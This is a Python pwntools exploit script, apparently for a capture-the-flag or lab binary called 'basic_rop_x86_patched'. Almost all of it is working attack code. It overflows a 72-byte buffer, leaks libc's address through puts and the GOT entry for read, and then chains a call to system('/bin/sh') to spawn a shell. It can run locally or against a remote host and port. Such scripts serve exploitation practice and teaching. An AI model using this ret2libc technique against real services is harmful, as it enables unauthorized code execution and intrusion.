from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './basic_rop_x86_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
context.arch = 'i386'
libc = ELF('libc.so.6', checksec=False)
payload = b'a' * 72
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['read'])
p.sendline(payload)
p.recv(72)
leak = u32(p.recv(4))
libc.address = leak - libc.symbols['read']
info('libc.address = ' + hex(libc.address))
payload2 = b'a' * 72
payload2 += p32(libc.symbols['system'])
payload2 += p32(0xDEADBEEF)
payload2 += p32(next(libc.search(b'/bin/sh\x00')))
p.sendline(payload2)
p.interactive()
